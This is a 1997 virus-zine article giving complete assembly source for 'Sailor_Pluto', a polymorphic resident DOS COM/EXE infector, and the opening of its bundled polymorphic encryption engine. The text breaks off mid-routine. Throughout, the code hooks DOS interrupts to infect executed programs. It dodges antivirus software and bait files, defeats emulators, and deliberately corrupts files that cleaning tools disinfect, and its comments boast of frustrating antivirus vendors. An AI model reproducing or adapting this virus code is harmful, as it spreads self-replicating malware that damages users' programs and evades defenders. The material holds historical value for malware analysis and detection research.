   ;                                        /-----------------------------\
   ;                                        | Xine - issue #2 - Phile 027 |
   ;                                        \-----------------------------/


   ;
   ; Name          : Sailor_Pluto
   ; Author        : b0z0
   ; Group         : iKx
   ; Origin        : Padania, Jan/Feb/Mar 1997
   ; Compile       : Use TASM 3.0
   ;                       tasm /m2 pluto.asm
   ;                       tlink pluto
   ; Description   : This is a polymorphic COM/EXE TSR infector using SMPE
   ;                 (Sailor Moon Polymorphic Engine) version 0.2. Well, what
   ;                 does SMPE do? SMPE will generate quite large decryptors
   ;                 (also some Kb sometime) that contains a lot of garbage
   ;                 code from the most normal one (reg moving, reg math
   ;                 operations, reading/using memory stuff, conditional and
   ;                 normal jumps, calls, pushes & pops, flag operations,
   ;                 sometime maybe an int3, operations with immediates, both
   ;                 with word and byte regs....), up to quite-do-nothing
   ;                 interrupts (many of them... some video, kbd and many
   ;                 dos stuff ones) and has also many antiemulator structures
   ;                 that, currently, are quite succesfull in many cases
   ;                 against various antiviruses. The poly engine will also
   ;                 randomly encrypt some more bytes than we gived as parameters
   ;                 and will also put some more unencrypted bytes after
   ;                 the encrypted stuff. This is of course to make disinfection
   ;                 very hard. To make the poly a little more interesting
   ;                 the maximal random number of instructions between various
   ;                 pieces of code is determinated (01Fh or 03Fh) when the
   ;                 virus goes resident. So generally in some DOS sessions
   ;                 the decryptors will generally look smaller and after some
   ;                 boots created decryptors may be bigger :) Of course we are
   ;                 just changing the max limit, so the medium size of the
   ;                 decryptors will be smaller or bigger, but even with
   ;                 the small limit, decryptors can be (depending on the
   ;                 random generator) quite big. Also the SMPE can use
   ;                 all the registers as counter (just ax won't be used,
   ;                 because it is too needed for ints and such like) and
   ;                 the standard pointers as pointers (bx,di,si,bp). SMPE
   ;                 is able to encrypt the body of the virus from the start
   ;                 forward or also starting from the end downto the start.
   ;                 It can do really quite a lot of different code, give it
   ;                 a look!
   ;                  Apart from the poly random bytes at the end of the body
   ;                 also some random bytes will be put at the end of the original
   ;                 host just before we will put our code. No info about how
   ;                 much of these is present anywhere in the virus, so ,even if
   ;                 the AVs will be in the future able to force my poly in some
   ;                 way, the cleaned files will still be a little dirty :)
   ;                  It may be interesting the COM infection marker. Infact
   ;                 Sailor_Pluto will put the marker (and of course look
   ;                 for it when needed) in a random place in the first 1FFh
   ;                 bytes. This is intended to make disinfection (expecially
   ;                 the CRC based ones) harder. If TBClean is able to go
   ;                 throught the decryptor (very sporadically, because it
   ;                 bail out at various ints and sometimes also crashes)
   ;                 then the virus (using the old stack method) won't let
   ;                 him to restore the real word but something else, so
   ;                 TBClean-ed COMs won't work properly ;) As for example
   ;                 of this anti-crc signature you can get the TBAV CRC
   ;                 files. Infact only first 20h bytes may be reconstructed,
   ;                 so also the dear old CRC-files users will have a very
   ;                 difficoult existence ]:)
   ;                  It has many antibait features:
   ;                   - won't infect files divisible 1000 and 1024
   ;                   - will compare a word of the previously infected
   ;                     file to prevent infecting equal files
   ;                   - files with digits aren't infected
   ;                   - won't infect if the first two letters of the filename
   ;                     are equal to two letters of the previous runned file
   ;                     (prevent infecting different goats with a standard
   ;                     part as filename)
   ;                   - won't infect files beginning with a 'V'. Probable
   ;                     bait or unknown 'V'irus releated program
   ;                   - won't infect files created in the current month. This
   ;                     may slow a little the infection stage, but generally
   ;                     programs (commercial or not) aren't created very
   ;                     recently. On the other side checking just the day as
   ;                     many viruses do may bee too weak as antigoat.
   ;                  The virus won't tunnel the original int21h but will rather
   ;                 try to get it from List_of_Lists_segment:10A0 (as
   ;                 Neurobasher teaches us :)).
   ;                  To prevent damaging COM files under Windroga 95 and such,
   ;                 Sailor_Pluto won't infect COMs if version is >= 7.
   ;                  The poly engine will be encrypted in memory with a 16bit
   ;                 xor and will be decrypted when needed. Of course at each
   ;                 use (decryption and at the end encryption) of the poly the
   ;                 key will be changed. To do this i needed to wrote a simple
   ;                 decryption loop, so i decided (once it was there written
   ;                 and ready) to use it also on the file. So after the quite
   ;                 complex decryptor of the poly engine (that can make add,
   ;                 sub, xor, rol, ror with byte or word. as for ror/rol the
   ;                 key can be also modified in the loop) we will found a
   ;                 classic word xor loop. Nothing special, but will make the
   ;                 removing of the virus again a little bit more timewasting ;)
   ;                  Since the poly does quite large decryptors, reserving
   ;                 a big amount of mem all the time from the installation isn't
   ;                 a good idea. So the poly will allocate (and of course free
   ;                 them when finished) a part of memory where it will store
   ;                 the decryptor and encrypted stuff at any run when the poly
   ;                 is needed.
   ;
   ;

   pluto            segment
                    assume cs:pluto,ds:pluto,es:pluto

           org 00h
   exe_start:

                   call    realstart
   realstart:
                   pop     bp
                   sub     bp,offset realstart     ; bp delta offset

                   push    cs
                   pop     ds

                   mov     di,offset virus_normal_encrypt_start
                   add     di,bp
                   mov     ax,crypt_size/2
                   push    di                      ; we will continue there
                   jmp     short enc_dec_smpe      ; do the simple xor loop


   enc_dec_smpe_engine:
                           ; this is called for the poly encryption. pointer
                           ; end lenght are already set up for it
                   mov     di,offset smpe_encrypted_start
                   mov     ax,((smpe_encrypted_end-smpe_encrypted_start)+1)/2
   enc_dec_smpe:
                   push    cx
                   mov     cx,ax
   simple_dec:
           ;       xor     word ptr ds:[di],0000h
                   db      81h,35h,00h,00h
                   inc     di
                   inc     di
                   loop    simple_dec
                   pop     cx
                   ret


   virus_normal_encrypt_start:
                   mov     di,offset isexe         ; DI on exe/com marker
                   add     di,bp

                   cld
                   cmp     byte ptr ds:[di],01h    ; is com or exe?
                   jne     exe_segment_adjust

                   push    cs
                   pop     es

   exe_segment_adjust:

                   push    es
                   push    es

                   push    di

                   mov     bx,bp
                   mov     ah,18h                   ; installation check
                   mov     al,ah
                   int     21h
                   cmp     ax,'SP'
                   jne     go_resident
                   jmp     bx                  ; if resident it will calculate
                                               ; the jump offset for us
   go_resident:
                   mov     dx,'MZ'
                   mov     ax,es               ; on PSP
                   xor     di,di
                   dec     ax                  ; to MCB
                   mov     ds,ax               ; DS on MCB
   l4mcb:
                   mov     bx,word ptr ds:[di+03h]
                   inc     bx
                   cmp     byte ptr ds:[di],dl ; last MCB?
                   je      last
                   add     ax,bx
                   mov     ds,ax
                   jmp     l4mcb
   last:
                   mov     cx,size_para+1          ; size in para + 1 for mcb
                   sub     ax,cx
                   add     ax,bx

                   sub     word ptr ds:[12h],cx         ; = PSP+2
                   sub     word ptr ds:[03h],cx         ; = MCB+3
                   mov     byte ptr ds:[di],dh             ; DH = 'M'

                   mov     ds,ax

                   dec     cx
                   mov     byte ptr ds:[di],dl      ; "create" last MCB block
                   mov     word ptr ds:[1],08h
                   mov     word ptr ds:[3],cx

                   inc     ax
                   mov     es,ax               ; es = virus segment

                   push    cs
                   pop     ds                  ; ds points on code
                   mov     cx,(virus_size+1)/2
                   mov     si,bp               ; start of the virus
                   rep     movsw               ; move virus

                   push    es                  ; virus segment

                   sub     ax,ax
                   mov     ds,ax

                   mov     word ptr es:[simple_dec + 2],ax ; poly isn't enc. yet

                   mov     cx,offset int21_handler
                   pop     dx

                   cli
                   xchg    cx,word ptr ds:[084h]           ; Set our int 21h
                   xchg    dx,word ptr ds:[086h]
                   mov     word ptr es:[old_int21_off],cx  ; handler
                   mov     word ptr es:[old_int21_seg],dx
                   sti

                   push    es
                   mov     ah,52h                  ; get list of lists
                   int     21h
                   push    es
                   pop     ds
                   pop     es
                   mov     si,10a0h                ; look for original int21h

                   cmp     word ptr ds:[si-2],9090h        ; first sig
                   jne     originals
                   cmp     byte ptr ds:[si],0e8h     ; check if it is.
                   jne     originals
                   mov     cx,si
                   mov     dx,ds
   originals:
                   mov     word ptr es:[orig_21h],cx
                   mov     word ptr es:[orig_21h+2],dx

                   mov     ah,01fh                 ; select if the max number
                   in      al,40h                  ; of garbage instructions
                   ror     al,1                    ; in the gargage generation
                   jc      dont_add_max            ; in this session will be
                   add     ah,020h                 ; 01fh or 03fh
   dont_add_max:
                   mov     byte ptr es:[do_garbage+1],ah   ; store it

   notinst:
                   pop     di

                   pop     es
                   pop     ds

                   cmp     byte ptr cs:[di],00h          ; com or exe?
                   jne     realcom

                   mov     ax,ds                         ; .EXE restore
           add ax,10h
                   add     cs:[di-09h],ax                ; modify cs

                   sub     bx,bx
                   sub     cx,cx
                   sub     dx,dx
                   sub     si,si
                   sub     bp,bp

           cli
                   mov     sp,word ptr cs:[di-07h]       ; restore sp
                   add     ax,word ptr cs:[di-05h]       ; modify ss
           mov ss,ax
           sti

           sub ax,ax
                   push    cs:[di-09h]           ; push victim cs
                   push    cs:[di-0bh]           ; push victim ip
                   sub     di,di
                   retf                          ; return on original cs:ip

   infip           dw      00000h
   infcs           dw      0fff0h

   infsp           dw      ?
   infss       dw  ?

   old_jump        db      0cdh,020h,00h           ; original first 3 bytes
   isexe           db      00h                     ; 00h=exe, 01=com
   old_two_rnd     db      00h,00h                 ; original random word

   virus_name      db      'Sailor_Pluto',0
   virus_author    db      '-b0z0/iKx-'

   do_original_21h:
                   pushf                           ; does a call to the
                   call    dword ptr cs:orig_21h   ; original (if got) int 21h
                   ret

   orig_21h        dd      00h

   realcom:
                   sub     ax,ax           ; .COM file restore
                   inc     ax
                   xchg    ah,al
                   push    ax              ; ax = begin of com in mem
                   push    ax
                   mov     si,ax
                   add     si,03h          ; si = where to start checking

   search_loop:
                   inc     si
                   cmp     word ptr ds:[si],'PS'   ; search for changed word
                   jne     search_loop

                   mov     bx,word ptr ds:[di+01h] ; original word

                   push    bx
                   pop     cx                      ; Be sure that TBClean
                   dec     sp                      ; and such like will
                   dec     sp                      ; permanently destroy
                   pop     ax                      ; the COM file :-)

                   mov     word ptr ds:[si],ax     ; restore changed word

                   lea     si,[di-03h]             ; old three bytes
                   pop     cx
                   pop     di

                   xor     ax,ax                   ; needed for some old DOS coms

                   movsw                           ; put original 3 bytes
                   movsb

                   jmp     cx                      ; jump at cs:100

   int21_handler:
                   xchg    ah,al
                   cmp     ax,1818h               ; installation check
           jne acheck
                   mov     ax,'SP'                ; Sailor_Pluto responses
                   add     bx,offset notinst
           iret
   acheck:
                   cmp     ax,004bh               ; program execution
           je  execute

   goint21:
                   xchg    ah,al
                   db      0EAh
   old_int21_off   dw      ?
   old_int21_seg   dw  ?

   ;
   origin          db      'PADANIA - 1997',0
   ;

   execute:
           pushf
                   push    dx
                   push    ax
                   push    cx
                   push    bx
           push    bp
                   push    ds
           push    si
           push    di
           push    es

                   mov     ah,19h          ; don't infect on floppyes
                   call    do_original_21h
                   cmp     al,2
                   jae     ok_disk
                   jmp     restore_registers
   ok_disk:
                   push    ds
           push    dx
                   mov     ax,3524h          ; get int24h seg and off
                   call    do_original_21h
                   mov     word ptr cs:[old_int24_off],bx  ; store them
                   mov     word ptr cs:[old_int24_seg],es

                   push    cs
           pop     ds
                   mov     dx,offset int24h          ; our int24h
           mov     ax,2524h
                   call    do_original_21h
                   pop     dx
                   pop     ds

                   push    dx
                   pop     di
   sloop:                                          ; ds:di-> filename
                   inc     di
                   cmp     byte ptr ds:[di],'.'
                   jne     sloop                   ; search for '.'
                   cmp     byte ptr ds:[di+4],00h
                   jne     sloop
                   inc     di
   look_sla:
                   dec     di
                   mov     al,byte ptr ds:[di-1]
                   cmp     al,'0'
                   jb      ok_name_let
                   cmp     al,'9'                  ; numeric in name?
                   jbe     exit_from_here
   ok_name_let:
                   cmp     al,'\'                  ; search for \
                   jne     look_sla
                   lea     si,antiviruses
                   mov     ax,word ptr ds:[di]
                   cmp     al,'V'          ; probable bait or AV software
                   je      exit_from_here
                   cmp     ax,word ptr ds:[exec_letter]    ; similar names?
                   je      exit_from_here
   avcloop:
                   mov     cx,word ptr cs:[si]
                   cmp     ax,cx
                   jne     notav
   exit_from_here:
                   stc
                   jmp     endscan
   notav:
                   inc     si                      ; next av signature
                   inc     si
                   cmp     byte ptr cs:[si],00h    ; end of the checked sigs?
                   je      endscan
                   jmp     avcloop
   endscan:
                   jnc     bogus
                   jmp     oh_shit2
   bogus:
                   mov     word ptr ds:[exec_letter],ax    ; store 2 letters
                   mov     ax,4300h
                   call    do_original_21h

                   push    cx
                   push    ds
                   push    dx
                   sub     cx,cx
                   call    set_attr

                   jnc     file_writeable
   exiting:
                   jmp     oh_shit
   file_writeable:
                   mov     ax,3d02h                ; open for rw
                   call    do_original_21h
                   jc      exiting
   ahead:
                   mov     bx,ax                   ; bx file handle as usual
           push    cs
           pop ds

   ; file lenght check

                   mov     al,02h                          ; lseek at end
                   call    movefile

                   or      dx,dx
                   jnz     leave_ax_check

                   cmp     ax,1388h                        ; AX = 5000?
                   jbe     set_marker

   leave_ax_check:
                   xor     dx,dx

                   push    ax
                   mov     cx,1000d                        ; divisible by 1000
                   div     cx
                   pop     ax
                   or      dx,dx
                   jz      set_marker

                   and     ax,1ffh                         ; divisible by 1024
                   jnz     oki_lenght_chk
   set_marker:
                   jmp     oh_shit
   oki_lenght_chk:

                   mov     ax,5700h                ; read date/time
                   call    do_original_21h
                   push    cx
                   push    dx

                   mov     ah,2ah                ; get system date
                   call    do_original_21h

                   sub     cx,1980               ; prepare for compare
                   mov     ax,dx
                   pop     dx
                   push    dx
                   push    cx
                   mov     cl,07
                   rol     dx,cl
                   pop     cx
                   and     dl,07fh               ; DX = years from 1980
                   cmp     dl,cl
                   jne     different_year        ; away if year is different

                   pop     dx
                   push    dx
                   mov     cl,5
                   ror     dx,cl
                   and     dl,0fh                ; get just month
                   xchg    ah,al
                   cmp     al,dl
                   je      closing               ; exit if month is current

   different_year:
                   xor     al,al
                   call    movefile              ; go at file start

                   mov     ah,3fh                ; read 200h bytes from file
                   mov     cx,200h
           lea dx,exeheader
           mov si,dx
                   call    do_original_21h

                   mov     ax,word ptr ds:[goat_word]
                   cmp     word ptr [si+02h],ax
                   je      closing                 ; is the same word at 02h ?

                   mov     ax,'ZM'

                   cmp     word ptr [si],ax        ; check MZ
                   je      exestuff
                   xchg    ah,al
                   cmp     word ptr [si],ax        ; check ZM
                   je      exestuff
                   cmp     byte ptr [si],0e9h      ; jump in com?
                   jne     cominf
                   push    si
                   add     si,02h
                   mov     cx,1ffh                 ; bytes to check

   signature_check:
                   inc     si
                   cmp     word ptr ds:[si],'PS'   ; look for our marker
                   jne     next_one
                   pop     si
                   jmp     closing
   next_one:
                   loop    signature_check
                   pop     si
   cominf:
                   jmp     cominfect               ; infect com file
   exestuff:
                   cmp     byte ptr [si+18h],'@'   ; no winexes
           je  closing
                   mov     ax,word ptr [si+12h]
                   xor     ax,word ptr [si+16h]
                   cmp     ax,'PS'                 ; check for infection marker
                   je      closing
                   cmp     word ptr [si+1ah],00h   ; internal ovl
           jne closing

                   call    exeinfect               ; infect .exe file
   closing:
                   pop     dx
                   pop     cx
                   mov     ax,0157h                ; set date/time
                   xchg    ah,al
                   call    do_original_21h

                   mov     ah,3eh                  ; close file
                   call    do_original_21h
   oh_shit:
                   pop     dx
                   pop     ds
                   pop     cx
                   call    set_attr                ; reput old attributes
   oh_shit2:
                   mov     ax,2524h                ; restore int 24h
                   mov     ds,cs:[old_int24_seg]
                   mov     dx,cs:[old_int24_off]
                   call    do_original_21h

   restore_registers:
                   pop     es
           pop di
           pop si
                   pop     ds
           pop bp
                   pop     bx
                   pop     cx
                   pop     ax
                   pop     dx
           popf
           jmp goint21


   cominfect:      ;com infection routine
           ;bx <-- filehandle
           ;si --> exeheader
           ;cs=ds=code

                   push    bx
                   mov     ah,30h          ; get dos version
                   call    do_original_21h
                   pop     bx
                   cmp     al,07h          ; is >= 7 ?
                   jae     exitcominfect   ; if so, no COMs, sry :)

                   push    ds              ; copy original 3 bytes
           pop es
                   lea     di,old_jump     ; in old_jump
           movsw
                   movsb
                   sub     si,03h

                   mov     ax,word ptr ds:[si+02h]         ; store word for cmp
                   mov     word ptr ds:[goat_word],ax

   getrndi:
                   in      al,40h          ; where to put our marker
                   cmp     al,4
                   jbe     getrndi
                   xor     ah,al
                   and     ah,01b

                   dec     al              ; it will go from 04 to 1feh

                   mov     di,ax
                   add     di,si

                   mov     ax,word ptr ds:[di]             ; save old word
                   mov     word ptr ds:[old_two_rnd],ax
                   mov     word ptr ds:[di],'PS'           ; put our marker

                   mov     al,02h                          ; lseek at end
                   call    movefile

                   cmp     ax,0C0DEh                       ; AX > 49374?
                   ja      exitcominfect                   ; JMP if >

                   call    add_end                         ; put some shit on end

                   push    ax

                   sub     ax,03h                          ; sub the jmp
                   mov     word ptr ds:[exeheader+01h],ax  ; new jump
                   mov     byte ptr ds:[exeheader],0e9h

                   mov     byte ptr isexe,01h              ; mark as com

                   pop     bp
                   add     bp,100h                         ; run offset

                   push    ds
                   push    si

                   mov     cx,(virus_size)
                   xor     dx,dx                   ; virus starts at seg:0
                   mov     al,01h                  ; can play with es

                   call    smpe                    ; call poly
                   jnc     poly_exit_ok
                   pop     si                      ; restore stack
                   pop     ds
                   jmp     closing
   poly_exit_ok:
                   push    es
                   pop     ds

                   mov     ah,40h                  ; write virus

                   pop     si
                   push    ax
                   call    do_original_21h

                   xor     al,al                   ; go at start
           call    movefile

                   pop     ax
                   pop     ds
                   mov     cx,200h                ; write first 512 bytes
                   mov     dx,offset exeheader
                   call    do_original_21h

   exitcominfect:
                   jmp     closing

   movefile:
                   mov     ah,42h                 ; move to start or end
           cwd
           sub cx,cx
                   call    do_original_21h
                   ret
   add_end:
                   push    ax
                   push    ds
   randi_add:
                   in      al,40h
                   or      al,al                   ; at least 1 byte
                   jz      randi_add
                   mov     ds,ax                   ; random "From:" place
                   xor     ah,ah
                   mov     cx,ax                   ; how much pure shit :-)
                   mov     ah,40h                  ; write to file
                   call    do_original_21h
                   pop     ds
                   pop     ax
                   add     ax,cx                           ; add to lenght
                   ret

   phrase          db      'Chaos is the future and beyond it is Freedom',0

   exeinfect:
           ;bx <- filehandle
           ;si -> exeheader

                   mov     cx,word ptr [si+04h]    ; calculate real lenght
                   mov     ax,512
                   mul     cx
                   add     ax,word ptr [si+02h]
                   adc     dx,00h

                   mov     di,dx

                   push    ax

                   mov     al,02h
                   call    movefile

                   pop     cx

                   cmp     dx,di                   ; compare lseek length with
                   jbe     oki_lenght
   exit_lenght:
                   ret
   oki_lenght:
                   cmp     ax,cx                   ; lenght loaded by the loader
                   ja      exit_lenght

                   call    add_end                 ; put some shit at end

                   adc     dx,0

                   push    ax                      ; store length
           push    dx

                   mov     cx,word ptr [si+14h]    ; store old IP
                   mov     infip,cx
                   mov     cx,word ptr [si+16h]    ; store old CS
                   mov     infcs,cx
                   mov     cx,word ptr [si+10h]    ; store old SP
                   mov     infsp,cx
                   mov     cx,word ptr [si+0eh]    ; store old SS
                   mov     infss,cx

           mov cx,10h
           div cx

           sub ax,word ptr [si+08h]
                   mov     word ptr [si+14h],dx    ; new cs:ip
           mov word ptr [si+16h],ax

                   mov     cx,'PS'
                   xor     cx,ax                   ; modify marker
                   mov     word ptr [si+12h],cx    ; store marker

                   mov     bp,dx

                   push    dx

                   mov     byte ptr [isexe],00h

                   push    ds
                   push    ax
                   push    si

                   mov     cx,(virus_size)
                   xor     dx,dx                   ; virus at cs:0
                   xor     al,al                   ; no es modif

                   call    smpe

                   push    es
                   pop     ds
                   pop     si

                   jnc     poly_exit_exe_ok        ; if carry error in poly
                   add     sp,0ah                  ; stack adjust
                   ret
   poly_exit_exe_ok:

                   mov     ah,40h                  ; write virus at end
                   push    cx
                   call    do_original_21h

                   sub     al,al                   ; move at start
                   call    movefile

                   pop     cx
                   pop     ax
                   pop     ds                      ; rewrite header
                   pop     dx

                   cmp     byte ptr [seg_sta],02h
                   je      cs_must_equ_ss

           ; we must here pay attention if our poly generated an operation
           ; using BP as pointer. This is because if BP is used and segment
           ; isn't explicitly given it will assume that we are working on SS
           ; and not on DS as with other registers as pointers... so if no
           ; segment is explicitly given in the poly and BP is used we must
           ; set SS=CS. In other cases SS=CS+1 so 'K' flag will be less often

                   inc     ax                      ; SS = CS + 1
   cs_must_equ_ss:
                   mov     word ptr [si+0eh],ax    ; new stack segment


                   add     dx,cx                   ; just after body
                   add     dx,500h                 ; some more coz needed
                   and     dl,0feh
                   mov     word ptr ds:[si+10h],dx ; new stack pointer

                   pop     dx
                   pop     ax

                   add     ax,cx
                   mov     cx,200h                 ; one page
                   adc     dx,00h
                   div     cx

                   xchg    word ptr [si+02h],dx    ; new length
                   mov     word ptr [goat_word],dx
                   inc     ax
                   mov     word ptr [si+04h],ax    ; new length

                   mov     ah,40h                  ; write header
                   mov     cx,200h
           mov dx,si
                   call    do_original_21h

   exitexeinfect:
           ret

   set_attr:
                   mov     ax,0143h                ; set attributes
                   xchg    al,ah
                   call    do_original_21h
                   ret

   antiviruses     db      'TB'    ; TBAV and releated
                   db      'AV'    ; AVP
                   db      'F-'    ; F-Prot
                   db      'SC'    ; Scan
                   db      'MS'    ; Misc Micro$Hit warez ;-)
                   db      'FI'    ; Findvirus
                   db      'NA'    ; NAv
                   db      'CO'    ; Command
                   db      00h     ; end of strings

   ; Int 24h handler. Just go away if error

   int24h:
                   mov     al,00h
                   iret

   ; Include poly engine source code

   include         spoly.asm

   virus_normal_encrypt_end:

   ; The poly engine has on end poly_mem_used bytes that are used only
   ; in memory

   virus_end:

   old_int24_off   dw      ?                   ;original int24 offset
   old_int24_seg   dw      ?                   ;original int24 segment

   exec_letter     dw      ?
   goat_word       dw      ?

   exeheader       db      201h dup (?)

   virus_end_memory:

   size_para=(virus_end_memory-exe_start+0fh)/10h ; virus size in memory
   virus_size=(virus_end - exe_start - poly_mem_used + 3)
   virus_crypt_size=(virus_normal_encrypt_end-virus_normal_encrypt_start)
   crypt_size=(virus_crypt_size-poly_mem_used+1)

   pluto   ends
   end exe_start

   ;------------------------------------------------------------------------------
   ;------------- Everything after this line is the SPOLY.ASM file ---------------
   ;------------------------------------------------------------------------------

   ;
   ; Sailor Moon Poly Engine v0.2
   ; in:
   ;    CX = bytes to encrypt
   ;    DS:DX = what we are going to encrypt (body of ourselves)
   ;    BP = offset at which it will run
   ;    AL = can ES be modified? (00 = NO (for exes) , 01 = YES (for coms))
   ; it is assumed that DS=CS !!!
   ;
   ; out:
   ;    CX,DI = lenght of the generated code
   ;    ES:DX = encrypted code
   ;    BX    = preserved
   ;

   poly_mem_used=(poly_data_mem_end-poly_data_mem)
   poly_paras=400h                                 ; memory for poly


   smpe:
           mov     ah,01h                          ; store ah flag
           mov     word ptr ds:[es_mody],ax
           call    enc_dec_smpe_engine             ; decrypt engine

   smpe_encrypted_start:
           cld
           push    bx

   ;; Try to allocate the needed memory for the poly stuff

           mov     ah,48h                          ; allocate mem for our poly
           mov     bx,poly_paras
           call    do_original_21h
           jnc     ok_memory
           mov     word ptr ds:[simple_dec+2],00   ; we won't encrypt it now,
                                                   ; so don't decrypt it later ;)
           pop     bx
           stc                                     ; no mem avaiable :(
           ret
   ok_memory:
           mov     es,ax                           ; allocated segment

           push    cx
           push    ds                              ; save important regs
           push    dx

   ;; Initialization start

           call    add_to_cx

           sub     bx,bx
           mov     byte ptr ds:[first_inc],46h
           mov     word ptr ds:[enc_lenght],cx     ; save lenght
           mov     word ptr ds:[enc_loop],3480h    ; engine initialization
           mov     word ptr ds:[isword],bx         ; clear type selection
           mov     word ptr ds:[random_value],09090h  ; clear rnd value
           mov     byte ptr ds:[second_inc],90h    ; clear second word inc
           mov     word ptr ds:[emu_trick],bx
           mov     word ptr ds:[push_nr],bx
           mov     word ptr ds:[cmp_check],bx
           dec     bx
           mov     word ptr ds:[count_reg],bx      ; clear used registers
           mov     word ptr ds:[nocx],bx           ; clear cx and seg flag

           sub     di,di                           ; so ES:DI = ES:0

           in      ax,40h                          ; initialize encryption
           mov     word ptr ds:[simple_dec+2],ax   ; value for next time

   ;; Initialization end


   ;; Decryption building start

           call    do_garbage                      ; decryptor gen. start
   rndget:
           call    do_random_dx_0f

           cmp     al,4            ; no sp
           je      rndget

           cmp     al,00h          ; no ax
           je      rndget

           mov     byte ptr ds:[count_reg],al

           mov     ah,al
           mov     al,0b8h                         ; mov _reg16_,immediate
           add     al,ah
           stosb

           in      al,40h
           ror     al,1
           jnc     on_one_side
           mov     byte ptr ds:[inverse],01h

   on_one_side:

           call    do_random_dx_0f                 ; 0-2 ROR, 3-7 MATH

           cmp     al,2
           ja      nororing                        ; select if ror/rol of math

           cmp     byte ptr es:[di-1],0b9h
           je      nororing                        ; if using CX no rol/ror!
           mov     byte ptr ds:[isrolror],01h      ; we'll ror/rol

           cmp     al,0
           jne     nororing
           inc     byte ptr ds:[isrolror]          ; rol/ror with diff CL

   nororing:
           ror     al,1
           jc      notaword
           mov     byte ptr ds:[isword],01h        ; word operation
   notaword:

           mov     word ptr ds:[counter_pos],di
           stosw                                   ; we will fill this later
           call    do_garbage                      ; shit stuff

   isntapnt:
           call    do_random_dx_0f
           cmp     al,03h                          ; select a pointer
           jb      isntapnt
           cmp     al,04h
           je      isntapnt
           cmp     al,byte ptr ds:[count_reg]      ; can't be same as counter
           je      isntapnt
           mov     byte ptr ds:[point_reg],al

           mov     ah,al
           mov     al,0b8h                 ; mov _reg16_,immediate
           add     al,ah
           stosb

           mov     pointer_di,di           ; save pointer position
           stosw

           call    do_garbage
           cmp     byte ptr ds:[isrolror],00h
           je      dontcl

           in      al,40h
           shr     ax,1
           pushf
           jc      make_a_cx
           mov     al,0b1h                         ; mov cl,rot_num
           stosb
           jmp     redorandom
   make_a_cx:
           mov     al,0b9h                         ; mov cx,rot_num
           stosb

   redorandom:
           mov     bx,0fh                          ; how many rols/rors
           mov     dx,bx
           call    do_random
           cmp     al,00h
           je      redorandom
           stosb
           mov     byte ptr ds:[cl_move],al
           mov     byte ptr ds:[nocx],01h
           popf
           jnc     no_cxbadd
           in      al,40h                          ; something for ch
           stosb
   no_cxbadd:
           call    randomshit                      ; garbage
   dontcl:
           mov     word ptr ds:[secphs],di         ; where we will jump
           push    di
           call    randomshit
           pop     ax
           ror     al,1
           jc      withsegmentop
           mov     al,0eh                          ; PUSH CS
           stosb
           call    randomshit
           mov     al,1fh                          ; POP DS
           stosb
           mov     byte ptr ds:[ds_mody],00h       ; don't use ds
           mov     byte ptr ds:[seg_sta],01h
           call    randomshit
           jmp     mathoperation
   withsegmentop:
           mov     al,02eh                         ; CS:
           stosb
   mathoperation:
           cmp     byte ptr ds:[isrolror],00h
           je      puremath
           mov     al,0d2h                         ; ROL/ROR base byte
           cmp     byte ptr ds:[isword],00
           je      rolbyte
           inc     al                              ; word = byte +1
   rolbyte:
           stosb                                   ; first rol/ror byte
           call    do_random_dx_0f
           ror     al,1
           mov     al,04h
           jnc     rollinging
           add     al,08h                          ; roring
           mov     byte ptr [enc_loop+1],04h       ; encryptor always with SI
           jmp     rolend
   rollinging:
           mov     byte ptr [enc_loop+1],0ch       ; ROL/ROR base
   rolend:
           cmp     byte ptr [point_reg],06h        ; ROL/ROR si?
           je      finish_pointer_ro
           inc     al
           cmp     byte ptr [point_reg],07h        ; ROL/ROR di?
           je      finish_pointer_ro
           add     al,2
           cmp     byte ptr [point_reg],03h        ; ROL/ROR bx?
           je      finish_pointer_ro
           add     al,03fh                         ; so it is bp
           inc     byte ptr [seg_sta]
           stosb
           sub     al,al                           ; bp needs 1 byte more
   finish_pointer_ro:
           stosb
           jmp     nowordi
   puremath:
           mov     al,080h                         ; ADD/SUB/XOR base
           cmp     byte ptr ds:[isword],00h
           je      goforbyte
           inc     al                              ; word = byte +1
   goforbyte:
           stosb
           mov     bx,02h
           mov     dx,03h
           call    do_random                       ; select which
           mov     cl,al
           mov     al,34h

           cmp     cl,00h
           je      xoring

           cmp     cl,01h
           jne     subbing
           sub     al,30h
           mov     byte ptr [enc_loop+1],2ch       ; ADD
           jmp     xoring
   subbing:
           sub     al,08h
           mov     byte ptr [enc_loop+1],04h       ; SUB
   xoring:
           cmp     byte ptr [point_reg],06h        ; SI?
           je      finish_pointer
           inc     al
           cmp     byte ptr [point_reg],07h        ; DI?
           je      finish_pointer
           add     al,2
           cmp     byte ptr [point_reg],03h        ; BX?
           je      finish_pointer
           add     al,03fh                         ; well, BP!
           inc     byte ptr [seg_sta]
           stosb
           sub     al,al                           ; bp needs 1 byte more
   finish_pointer:
           stosb
           in      al,40h
           mov     byte ptr ds:[random_value],al
           stosb                                  ; one random value
           cmp     byte ptr ds:[isword],00h
           je      nowordi                        ; encrypting words?
           in      al,40h
           stosb
           mov     byte ptr ds:[random_value+1],al ; one more
   nowordi:
           call    do_inc_pointer                  ; increment pointer

           cmp     byte ptr ds:[isrolror],02h      ; rol/ror with changing CX
           jne     no_cl_change
           call    random_foo_instructions
           in      al,40h
           ror     al,1
           mov     al,041h                         ; inc cx
           jc      increment_cx
           add     al,08h                          ; 49h = dec cx
   increment_cx:
           mov     byte ptr ds:[random_value+1],al ; put also in encryptor
           stosb

   no_cl_change:
           cmp     byte ptr ds:[isword],00h        ; is word?
           je      noby
           call    do_inc_pointer                  ; increment once more
   noby:

           call    do_garbage
           mov     al,048h                         ; dec counter
           add     al,byte ptr ds:[count_reg]
           stosb

           call    do_random_dx_0f                 ; CMP or no CMP?
           cmp     al,05h
           jae     direct_ncmp

           push    ax
           call    do_garbage
           pop     ax

           cmp     al,02h
           ja      no_compare

           mov     byte ptr ds:[can_doda],01h

           mov     ah,083h                         ; base for ops
           cmp     al,00h
           ja      no_cmp
           mov     al,0f8h                         ; CMP counter,0
           jmp     comp_store
   no_cmp:
           cmp     al,02h
           je      oring
           mov     al,0f0h                         ; XOR counter,0
           jmp     comp_store
   oring:
           mov     al,0c8h                         ; OR  counter,0
   comp_store:
           xchg    ah,al
           add     ah,byte ptr ds:[count_reg]      ; store op
           stosw

           sub     al,al                           ; CMP/XOR/OR counter,0
           stosb
           jmp     direct_ncmp
   no_compare:
           cmp     al,04h
           je      do_with_and
           mov     al,0bh                          ; OR counter,counter
           jmp     second_operand
   do_with_and:
